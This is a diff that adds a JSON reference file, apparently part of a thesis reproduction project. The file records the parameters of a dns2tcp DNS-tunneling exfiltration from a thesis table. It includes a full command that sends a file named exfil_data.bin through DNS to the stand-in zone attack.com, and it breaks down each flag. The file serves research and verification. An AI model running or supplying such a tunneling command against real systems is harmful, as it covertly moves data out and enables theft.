@@ -1,0 +1,30 @@
+{
+  "table": "table_21",
+  "provenance": "thesis_reference_values",
+  "source": "Chapter 5, Table 21 (p.140) of the thesis",
+  "note": "Table 21 is the parameter configuration for the dns2tcp exfiltration. The four flag/value pairs are a literal record, not a measurement; the correct reproduction is a verbatim match against row A01 of data/attack_matrix.csv, which table_21_dns2tcp_params.py performs in --verify-only mode (the default).",
+  "attack_matrix_row": "A01",
+  "command": "python3 dns2tcp.py -z attack.com -r 53 -t A -d exfil_data.bin",
+  "rows": [
+    {
+      "flag": "-z",
+      "description": "Target zone domain for DNS tunneling",
+      "value": "attack.com"
+    },
+    {
+      "flag": "-r",
+      "description": "Destination port for DNS resolution",
+      "value": "53"
+    },
+    {
+      "flag": "-t A",
+      "description": "DNS query resource record type",
+      "value": "A"
+    },
+    {
+      "flag": "-d",
+      "description": "Binary payload file designated for transmission",
+      "value": "exfil_data.bin"
+    }
+  ]
+}
